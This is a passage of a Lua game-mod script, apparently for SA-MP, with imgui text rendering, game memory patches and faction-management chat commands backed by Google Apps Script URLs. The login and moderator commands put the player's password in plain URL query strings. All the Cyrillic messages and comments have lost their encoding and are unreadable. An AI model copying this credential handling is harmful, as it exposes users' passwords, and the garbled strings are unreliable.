	    local style = imgui.GetStyle()
	    local colors = style.Colors
	    local ImVec4 = imgui.ImVec4

	    local explode_argb = function(argb)
		        local a = bit.band(bit.rshift(argb, 24), 0xFF)
		        local r = bit.band(bit.rshift(argb, 16), 0xFF)
		        local g = bit.band(bit.rshift(argb, 8), 0xFF)
		        local b = bit.band(argb, 0xFF)
		        return a, r, g, b
	    end

	    local getcolor = function(color)
		        if color:sub(1, 6):upper() == 'SSSSSS' then
			            local r, g, b = colors[1].x, colors[1].y, colors[1].z
			            local a = tonumber(color:sub(7, 8), 16) or colors[1].w * 255
			            return ImVec4(r, g, b, a / 255)
		        end

		        local color = type(color) == 'string' and tonumber(color, 16) or color
		        if type(color) ~= 'number' then return end
		        local r, g, b, a = explode_argb(color)
		        return imgui.ImColor(r, g, b, a):GetVec4()
	    end

	    local render_text = function(text_)
				  for w in text_:gmatch('[^\r\n]+') do
				 			local text, colors_, m = {}, {}, 1
						  w = w:gsub('{(......)}', '{%1FF}')
						  while w:find('{........}') do
								  local n, k = w:find('{........}')
								  local color = getcolor(w:sub(n + 1, k - 1))
								  if color then
										  text[#text], text[#text + 1] = w:sub(m, n - 1), w:sub(k + 1, #w)
										  colors_[#colors_ + 1] = color
										  m = n
								  end

				  				w = w:sub(1, n - 1) .. w:sub(k + 1, #w)
				  		end

						  if text[0] then
						  		for i = 0, #text do
										  imgui.TextColored(colors_[i] or colors[1], u8(text[i]))
											if imgui.IsItemClicked() then	if SelectedRow == A_Index then ChoosenRow = SelectedRow	else	SelectedRow = A_Index	end	end
											imgui.SameLine(nil, 0)
				  				end

									imgui.NewLine()
				  		else
									imgui.Text(u8(w))
									if imgui.IsItemClicked() then	if SelectedRow == A_Index then ChoosenRow = SelectedRow	else	SelectedRow = A_Index	end	end
							end
				  end
	    end
	    render_text(text)
end

function patch_samp_time_set(enable)
		if enable and default == nil then
				default = readMemory(sampGetBase() + 0x9C0A0, 4, true)
				writeMemory(sampGetBase() + 0x9C0A0, 4, 0x000008C2, true)
		elseif enable == false and default ~= nil then
				writeMemory(sampGetBase() + 0x9C0A0, 4, default, true)
				default = nil
		end
end

function kvadrat()
    local KV = {
        [1] = "�",
        [2] = "�",
        [3] = "�",
        [4] = "�",
        [5] = "�",
        [6] = "�",
        [7] = "�",
        [8] = "�",
        [9] = "�",
        [10] = "�",
        [11] = "�",
        [12] = "�",
        [13] = "�",
        [14] = "�",
        [15] = "�",
        [16] = "�",
        [17] = "�",
        [18] = "�",
        [19] = "�",
        [20] = "�",
        [21] = "�",
        [22] = "�",
        [23] = "�",
        [24] = "�",
    }
    local X, Y, Z = getCharCoordinates(playerPed)
    X = math.ceil((X + 3000) / 250)
    Y = math.ceil((Y * - 1 + 3000) / 250)
    Y = KV[Y]
    local KVX = (Y.."-"..X)
    return KVX
end

function drawPieSub(v)
  if pie.BeginPieMenu(u8(v.name)) then
    for i, l in ipairs(v.next) do
      if l.next == nil then
        if pie.PieMenuItem(u8(l.name)) then l.action() end
      elseif type(l.next) == 'table' then
        drawPieSub(l)
      end
    end
    pie.EndPieMenu()
  end
end

function get_crosshair_position()
    local vec_out = ffi.new("float[3]")
    local tmp_vec = ffi.new("float[3]")
    ffi.cast(
        "void (__thiscall*)(void*, float, float, float, float, float*, float*)",
        0x514970
    )(
        ffi.cast("void*", 0xB6F028),
        15.0,
        tmp_vec[0], tmp_vec[1], tmp_vec[2],
        tmp_vec,
        vec_out
    )
    return vec_out[0], vec_out[1], vec_out[2]
end

function getAngle(x, y) -- �������� ���� ����� ���������� � ��������� ������ �� ������� ���������
		local myX, myY, myZ = getCharCoordinates(PLAYER_PED)
		local crsX, crsY, crsZ = convertScreenCoordsToWorld3D(sx, sy, 700.0)
		local a = math.sqrt(((x-crsX)^2) + ((y-crsY)^2)) -- ��������� ����� ��������� ������ � ������ ���� ��������� ������
		local b = math.sqrt(((myX-x)^2) + ((myY-y)^2)) -- ���������� ����� ������������ ��������� � ��������� ������
		local c = math.sqrt(((crsX-myX)^2) + ((crsY-myY)^2)) -- ���������� ����� ������������ ��������� � ������ ���� ��������� �����
		local cosA = ((b*b) + (c*c) - (a*a))/(2*b*c) -- �������� ������� ����
		local radA = math.acos(cosA) -- �������� �������� ���� � �������� ����� ����������
		local deg = math.deg(radA) -- ���� � ��������

		-- ���������� ��� ������ ������� ����� ������� �� ������������ ������
		--local rad = math.atan2((x - myX), (y - myY))
		--local deg = math.deg(rad)
		--return deg


		-- ����� �� ��������
		local myAngle = 360 - getCharHeading(PLAYER_PED)
		if (myAngle >= 0 and myAngle <= 90) and (x <= myX or y >= myY) then return -1 * deg end
		if (myAngle > 90 and myAngle <= 180) and (x >= myX or y >= myY) then return -1 * deg end
		if (myAngle > 180 and myAngle <= 270) and (x >= myX or y <= myY) then return -1 * deg end
		if (myAngle > 270 and myAngle <= 360) and (x <= myX or y <= myY) then return -1 * deg end
		return deg

		-- ����� ��������� ������������ - ����� �� ������� � ����� �� �� ��������
		-- local vec_a = {["x"] = crsX - myX, ["y"] = crsY - myY, ["z"] = crsZ - myZ}
		-- local vec_b = {["x"] = x - myX, ["y"] = y - myY, ["z"] = z - myZ}
		-- local vec_c = {["x"] = (vec_a.y * vec_b.z) - (vec_a.z * vec_b.y), ["y"] = (vec_a.z * vec_b.x) - (vec_a.x * vec_b.z), ["z"] = (vec_a.x * vec_b.y) - (vec_a.y * vec_b.x)}
		-- --print("�������: " .. vec_a.z .. ";" .. vec_c.z .. "")
		-- if (vec_c.z > 0 and vec_a.z > 0) or (vec_c.z < 0 and vec_a.z < 0) then return deg else return -1 * deg end
end

function getcars()
		local chandles = {}
		local tableIndex = 1
		local vehicles = getAllVehicles()
		local fcarhandle = isCharInAnyCar(PLAYER_PED) and storeCarCharIsInNoSave(PLAYER_PED) or 12
		for k, v in pairs(vehicles) do
				if doesVehicleExist(v) and v ~= fcarhandle then table.insert(chandles, tableIndex, v) tableIndex = tableIndex + 1 end
		end

		if table.maxn (chandles) == 0 then return nil else return chandles end
end

function cmd_balogin(sparams)
	lua_thread.create(function()
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /balogin [������].", 0xffff0000) return end
		local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local nick = sampGetPlayerNickname(myid)
						--lvl = access
		local responsetext = req('https://script.google.com/macros/s/AKfycbx28UFg93in4xEHLnLjBPF-3BXRNddlNiiW0RARAZ-hHvu3kwo/exec?do=login&nick=' .. nick .. '&p=' .. sparams .. '')
		local re1 = regex.new("@@.@ (Access granted|Registration successfully)\\. Level\\: (\\d) @.@.@") --
		local response, lvll = re1:match(responsetext)
		if response == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����� ��� ������.", 0xffff0000) return end
		if response == "Registration successfully" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� ������ ���������� �������.", 0xffff0000) end
		alevel = tonumber(lvll)
		moderpas = "modernick=" .. nick .. "&p=" .. sparams .. ""
		
		if alevel > 0 then
			sampRegisterChatCommand("lek", cmd_lek)
			sampRegisterChatCommand("pcheck", cmd_pcheck)
			sampRegisterChatCommand("tren", cmd_tren)
		end

		if alevel > 1 then
			sampRegisterChatCommand("padd", cmd_padd)
			sampRegisterChatCommand("pdel", cmd_pdel)									
			sampRegisterChatCommand("mark", cmd_mark)
			sampRegisterChatCommand("add", cmd_add)
			sampRegisterChatCommand("del", cmd_del)
			sampRegisterChatCommand("change", cmd_change)
		end

		if alevel > 2 then
			sampRegisterChatCommand("otm", cmd_otm)
		end

		if alevel == 3 or alevel == 6 then 
			sampRegisterChatCommand("fond", cmd_fond) 
			fond[2] = getPlayerMoney(PLAYER_HANDLE)
			local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=fond&act=ref&" .. moderpas .. "")
			local re1 = regex.new("\\@\\@\\.\\@ L\\: (.*) \\@\\@\\.\\.\\@\\.\\@") --
			local names = re1:match(responsetext)
			if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ����� ����� ������.", 0xffff0000) else fond[1] = names end 
		end
		
		if alevel > 4 then
			sampRegisterChatCommand("reg", cmd_reg)
			sampRegisterChatCommand("ban", cmd_ban)
			sampRegisterChatCommand("moder", cmd_moder)
		end
		
		sendtolog("�������� ����������� � �������� ����������", 1.1)
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nick .. " - �������� ����������� � �������� ���������� ������ " .. alevel .. ".", 0xffff0000)
	end)
end


function cmd_check()
		lua_thread.create(
				function()
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ����� �������.", 0xffff0000)
						local responsetext = req('https://script.google.com/macros/s/AKfycbya8zAQ_EMWg9pp2mFEh5XbKVym-nJEMlbc-fyayvN932cPAvQ/exec?do=check&' .. moderpas .. '')
						local re1 = regex.new("@##@ (.*) @@@@##@@") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������ #1.", 0xffff0000) return end
						local namesarr = string.split(names, "; ")
						for k, v in pairs(namesarr) do
								local id = sampGetPlayerIdByNickname(v)
								if id ~= nil then
										local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
										local clist = clist == "ffff" and "fffafa" or clist
										sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. v .. "[" .. tostring(id) .. "]{fffafa} - � ����", 0xffff0000)
								end
						end
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����� �������.", 0xffff0000)
				end
		)
end

function cmd_reg(sparams)
		lua_thread.create(
				function()
						if alevel < 5 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /reg [id] [T-������/M-�������� ������/H - �������� ����]", 0xFFFF0000) return end
						local params = {}
						for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
						local id = -1
						if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(params[1])) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))

						if params[2] ~= "T" and params[2] ~= "M" and params[2] ~= "H" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /reg [id] [T-������/M-�������� ������/H - �������� ����]", 0xFFFF0000) return end
						if params[2] == "H" and alevel < 3 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������������ ���� ��� ������ ������� ��������� �����.", 0xffff0000) return end
						local part = params[2] == "T" and "0" or params[2] == "H" and "2" or "1"
						local responsetext = req('https://script.google.com/macros/s/AKfycbwBG17iJ1Jpy5Ft9lmACSIZyrOA7QBydzgM1S12jkARF7ddEWA/exec?do=add&name=' .. nick .. '&part=' .. part .. '&' .. moderpas .. '')
						local re1 = regex.new("@@# Updated @#@") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ��������������� � �������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������ " .. nick .. " � ������� ��� ��������.", 0xffff0000) end
				end
		)
end

function cmd_ban(sparams)
		lua_thread.create(
				function()
						if alevel < 5 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /ban [id]", 0xFFFF0000) return end
						local params = {}
						for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
						local id = -1
						if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(params[1])) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))
						local responsetext = req('https://script.google.com/macros/s/AKfycbwBG17iJ1Jpy5Ft9lmACSIZyrOA7QBydzgM1S12jkARF7ddEWA/exec?do=find&name=' .. nick .. '&del=3YxEKPHYQI&' .. moderpas .. '')
						local re1 = regex.new("Row deleted") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������� ������ � ������ " .. nick .. ".", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ � ������� � ������ " .. nick .. " ��� ����������.", 0xffff0000) end
				end
		)
end

function cmd_fond(sparams)
	lua_thread.create(function()
		if alevel ~= 3 and alevel ~= 6 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /fond [bank/withdraw [��� �������/������] [����� (��� �����)] [����������] / balance - �������� ����� ����� ��� �������]", 0xFFFF0000) return end
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		if params[1] == nil or (params[1] ~= "bank" and params[1] ~= "withdraw" and params[1] ~= "balance") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /fond [bank/withdraw/balance]", 0xFFFF0000) return end
		if (params[1] == "bank" or params[1] == "withdraw") then
			if params[2] == nil or params[2] == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ���", 0xFFFF0000) return end
			if params[3] == nil or params[3] == "" or tonumber(params[3]) == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �����", 0xFFFF0000) return end
			if params[4] == nil or params[4] == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����������", 0xFFFF0000) return end
		end
		

		local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=fond&act=" .. (params[1] == "balance" and "balance" or "" .. params[1] .. "&who=" .. translit(params[2]) .. "&m=" .. params[3] .. "&prim=" .. translit(strrest(params, 4)) .. "") .. "&" .. moderpas .. "")
		local re1 = regex.new("\\@\\@\\.\\@ L\\: (.*) \\@\\@\\.\\.\\@\\.\\@") --
		local names = re1:match(responsetext)
		if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ����� ����� ������.", 0xffff0000) else fond[1] = names sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� ����� ������ ������� ���������.", 0xffff0000) end 
	end)
end

function cmd_otm()
	lua_thread.create(function()
		if alevel < 3 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ���� ����������...", 0xFFFF0000)
		local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=getlist")
		local str = responsetext:match("%@%@%.%@ (.*) %@%@%.%.%@%.%@")
		local rukstr = str:match("(.*) @@....@") -- ���-��
		if rukstr ~= nil then for k, v in ipairs(rukstr:split("; ")) do local a = v:split(" ") soptlist[1][a[1]  .. "_" .. a[2]] = 0 end end
				
		local osnstr = str:match("@@....@ (.*) @@...@") -- �������� ������
		if osnstr ~= nil then for k, v in ipairs(osnstr:split("; ")) do local a = v:split(" ") soptlist[1][a[1]  .. "_" .. a[2]] = 0 end end
					
		local stjstr = str:match("@@...@ (.*)") -- �������
		if stjstr ~= nil then for k, v in ipairs(stjstr:split("; ")) do local a = v:split(" ") soptlist[1][a[1]  .. "_" .. a[2]] = 0 end end
		
		
		otmmode = true 
		sampSendChat("/offmfilter clear") wait(500) sampSendChat("/offmembers")				
		while otmmode do wait(0) end

		local names = ""
		local otms = ""
		for k, v in pairs(soptlist[1]) do 
			local f, s = k:match("(.*)%_(.*)") 
			names = names == "" and "" .. f .. "%20" .. s .. "" or "" .. names .. "@.@" .. f .. "%20" .. s .. ""
			otms = otms == "" and v or "" .. otms .. "@.@" .. v .. ""
		end
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� ���������� ��������. ������� ��������� ������ � �������...", 0xFFFF0000)
		
		local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=otm&names=" .. names .. "&otms=" .. otms .. "&" .. moderpas .. "")
		local re1 = regex.new("@@.@ Update complete @@..@.@") --
		local names = re1:match(responsetext)
		if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������� � ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� � ������� ������ ������� ���������.", 0xffff0000) end 
		return 
	end)		
end

function cmd_tren(sparams)
	lua_thread.create(function()
		if alevel < 1 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /tren [�������] [���������� ���������] [���������� �����������] [��������� (1-3)] [������������� �����������]", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}1 - ������, 2 - ������ ��, 3 - ���������", 0xFFFF0000) return end
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		if params[1] == nil or params[2] == nil or params[3] == nil or params[4] == nil or params[5] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� /tren [�������] [���������� ���������] [���������� �����������] [��������� (1-3)] [������������� �����������]", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}1 - ������, 2 - ������ ��, 3 - ���������", 0xFFFF0000) return end
		
		local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=tren&vic=" .. params[4] .. "&where=" .. translit(params[1]) .. "&we=" .. params[2] .. "&they=" .. params[3] .. "&who=" .. translit(strrest(params, 5)) .. "&" .. moderpas .. "")
		local re1 = regex.new("@@.@ Complete @@..@.@") --
		local names = re1:match(responsetext)
		if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ���������� ����� � ���������� ���������� � ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� � ���������� ���������� ������� ����������� � ������� ������.", 0xffff0000) end 
		return 
	end)
end

function cmd_pcheck(sparams)
	lua_thread.create(
			function()
					if alevel < 1 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ����� " .. (sparams == "-1" and "���� ������������� �������" or "������������� ������� � ����") .. ".", 0xffff0000)
					local Members1Text = getMembersText()
					local members = {}
					for v in Members1Text:gmatch('[^\n]+') do local nickname, zv = v:match("%[%d+%] %[%d+%] (%a+%_%a+)	(%W*) %[.*%]") if zv ~= nil then members[nickname] = zv end end
					local responsetext = req('https://script.google.com/macros/s/AKfycbw2mSf730dll2c7GedYaEplttqdTRmZY48sc05c7TDsHBPCv-Rf/exec?do=check&' .. moderpas .. '')
					local re1 = regex.new("@##@ @@..@ NAMES: (.*) @@@@##@@") --
					local names = re1:match(responsetext)
					if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������ #1.", 0xffff0000) return end
					local namesarr = string.split(names, "; ")
					for k, v in pairs(namesarr) do
						local dd, nn, prim, who = v:match("(.*) %@%=%@ (.*) %@%=%=%@ (.*) %@%=%=%=%@ (.*)")
						local id = sampGetPlayerIdByNickname(nn)
						if id ~= nil then
							local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
							local clist = clist == "ffff" and "fffafa" or clist
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. nn .. "[" .. tostring(id) .. "] - " .. (members[nn] ~= nil and members[nn] or "����������") .. "{fffafa} - � ���� - " .. prim .. "", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������: " .. who .. ", " .. dd .. "", 0xffff0000)
						else
							if sparams == "-1" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}" .. nn .. "{fffafa} - �� � ���� - " .. prim .. "", 0xffff0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������: " .. who .. ", " .. dd .. "", 0xffff0000) end
						end
					end
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����� �������.", 0xffff0000)
			end
	)
end

function cmd_padd(sparams)
		lua_thread.create(
				function()
						if alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /padd [id/nick] ([����������])", 0xFFFF0000) return end
						local params = {}
						for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
						local id = -1
						if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(params[1])) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))
						local responsetext = req('https://script.google.com/macros/s/AKfycbw2mSf730dll2c7GedYaEplttqdTRmZY48sc05c7TDsHBPCv-Rf/exec?do=add&name=' .. nick .. '' .. (params[2] ~= nil and '&text=' .. translit(strrest(params, 2)) .. '' or '') .. '&who=' .. sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) .. '&date=' .. os.date("%d.%m.%Y") .. '&' .. moderpas .. '')
						local re1 = regex.new("@@.@ (.*) @.@@") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ " .. nick .. " � ������ �������������.", 0xffff0000) return end
						
						if names:match("Done") ~= nil then
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� �������� � ������ �������������.", 0xffff0000)
							return
						end

						if names:match("False V") ~= nil then
							local res, who, date = names:match("False V%: (.*)%; (.*)%; (.*)")
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��������� � {FF0000}�� ��������.", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� {FF0000}" .. res .. " {FFFAFA}�������: {FF0000}" .. who .. " " .. date .. ".", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������ � ������������� ��� ����������� �� �����?", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� Y - ��� ��������, N - ��� ������. {FF0000}��� �������� ����� ����� ������ �� �� ��������!", 0xffff0000)
							while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ " .. nick .. " � ������ �������������.", 0xffff0000) return end end

							local responsetext = req('https://script.google.com/macros/s/AKfycbw2mSf730dll2c7GedYaEplttqdTRmZY48sc05c7TDsHBPCv-Rf/exec?do=add&name=' .. nick .. '' .. (params[2] ~= nil and '&text=' .. translit(strrest(params, 2)) .. '' or '') .. '&who=' .. sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) .. '&date=' .. os.date("%d.%m.%Y") .. '&ignorev=1&' .. moderpas .. '')
							local re1 = regex.new("@@.@ (.*) @.@@") --
							local names = re1:match(responsetext)

							if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ " .. nick .. " � ������ �������������.", 0xffff0000) return end
							if names:match("Done") ~= nil then
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ������� �� �� ��������.", 0xffff0000)
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� �������� � ������ �������������.", 0xffff0000)
								return
							end
						end

						if names:match("False BL") ~= nil then
							local res, who = names:match("False BL%: (.*)%; (.*)")
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��������� � {FF0000}�� ������.", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� {FF0000}" .. res .. " {FFFAFA}�������: {FF0000}" .. who .. ".", 0xffff0000)
							sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ " .. nick .. " � ������ �������������.", 0xffff0000)
						end
				end
		)
end

function cmd_pdel(sparams)
		lua_thread.create(
				function()
						if alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
						if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /pdel [id/nick] ([������� ��������� � �� ��������])", 0xFFFF0000) return end
						local params = {}
						for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
						local id = -1
						if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
						if id ~= -1 and not sampIsPlayerConnected(tonumber(params[1])) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local nick = id == -1 and params[1] or sampGetPlayerNickname(tonumber(params[1]))
						local reasonchs = params[2] ~= nil and strrest(params, 2) or ""
						local responsetext = req('https://script.google.com/macros/s/AKfycbw2mSf730dll2c7GedYaEplttqdTRmZY48sc05c7TDsHBPCv-Rf/exec?do=delete&name=' .. nick .. '&' .. moderpas .. '' .. (params[2] ~= nil and '&chs=1&reason=' .. translit(strrest(params, 2)) .. '&who=' .. sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) .. '&date=' .. os.date("%d.%m.%Y") .. '' or '') .. '')
						local re1 = regex.new("@@.@ Row deleted") --
						local names = re1:match(responsetext)
						if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������� ������ " .. nick .. " �� ������ �������������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. nick .. " ��� ������ �� ������ �������������.", 0xffff0000) end
				end
		)
end

function cmd_add(sparams) 
		lua_thread.create(function()
			if alevel < 2 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������", 0xFFFF0000) return end
			if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /add [id] ([���� ���������� ��������� � ������� dd.mm.yyyy])", 0xFFFF0000) return end
			local params = {}
			for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
			local id = -1
			if tonumber(params[1]) ~= nil and tonumber(params[1]) >= 0 and tonumber(params[1]) <= 999  then id = tonumber(params[1]) end
			if id == -1 or (id ~= -1 and not sampIsPlayerConnected(tonumber(params[1]))) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
			local nick = sampGetPlayerNickname(tonumber(params[1]))

			local Members1Text = getMembersText()
			for v in Members1Text:gmatch('[^\n]+') do
				local _, zv, afk = v:match("%[%d+%] %[(%d+)%] " .. nick .. "	(%W*) %[%d+%](.*)")
				if zv ~= nil then
					local reg = regex.new("(.*)\\_(.*)") --
					local fname, sname = reg:match(nick)
					local nickname = "" .. fname .. " " .. sname .. ""
					
					local data = params[2] ~= nil and params[2] or os.date("%d.%m.%Y")
			
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ����������� ������� � ������� ������ ������ {ff0000}" .. nickname .. "", 0xFFFF0000)
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������: {ff0000}" .. zv .. "{fffafa}, ���� ���������� ���������: {ff0000}" .. data .. ".", 0xFFFF0000)
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� Y ��� ������������� � N ��� ������.", 0xFFFF0000)
					while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������.", 0xFFFF0000) return end end
					
					local result, logmyid = sampGetPlayerIdByCharHandle(PLAYER_PED)
					local lognick = sampGetPlayerNickname(logmyid)
					local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=add&nick=' .. nickname .. '&rank=' .. translit(zv) .. '&date=' .. data .. '&who=' .. lognick .. '&' .. moderpas .. '')
					local re1 = regex.new("@@.@ Add complete @@..@.@") --
					local names = re1:match(responsetext)
					if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������ " .. nick .. " � ������� ������.", 0xffff0000) return end
				
					local responsetext = req('https://script.google.com/macros/s/AKfycbw2mSf730dll2c7GedYaEplttqdTRmZY48sc05c7TDsHBPCv-Rf/exec?do=delete&name=' .. nick .. '&' .. moderpas .. '')
					local re2 = regex.new("@@.@ Row deleted") --
					local names2 = re2:match(responsetext)
